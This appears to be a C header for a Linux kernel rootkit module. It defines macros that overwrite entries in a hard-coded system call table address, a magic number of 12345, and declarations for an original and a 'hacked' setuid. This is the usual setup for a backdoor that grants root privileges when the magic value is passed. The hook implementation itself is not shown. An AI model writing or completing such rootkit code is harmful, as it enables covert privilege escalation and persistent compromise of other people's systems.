#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>

//macros
#define BAIL_ON_ERROR(iError)                                                 \
    if (iError) {                                                             \
        printk(KERN_ERR "ERROR [%d]- %s:%s, line %d \n",                      \
                iError,__FILE__,__FUNCTION__,__LINE__);                       \
        goto error;                                                           \
    }

#define DEBUG(msg)                                                           \
    printk(KERN_DEBUG "DEBUG [%s:%s at %d]: %s\n",         \
            __FILE__,__FUNCTION__,__LINE__, msg)

#define SYSCALL_TABLE 0xffffffff818001c0

#define MAGIC_NUMBER 12345

#define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
    orig_func = (void*) sys_call_table[__NR_index];                         \
    sys_call_table[__NR_index] = (unsigned long) hacked_func

#define UNHOOK_SYSCALL(sys_call_table, orig_func, __NR_index)               \
    sys_call_table[__NR_index] = (unsigned long) orig_func

//original sycalls
asmlinkage long (*orig_setuid) (uid_t uid);

asmlinkage long (hacked_setuid) (uid_t uid);
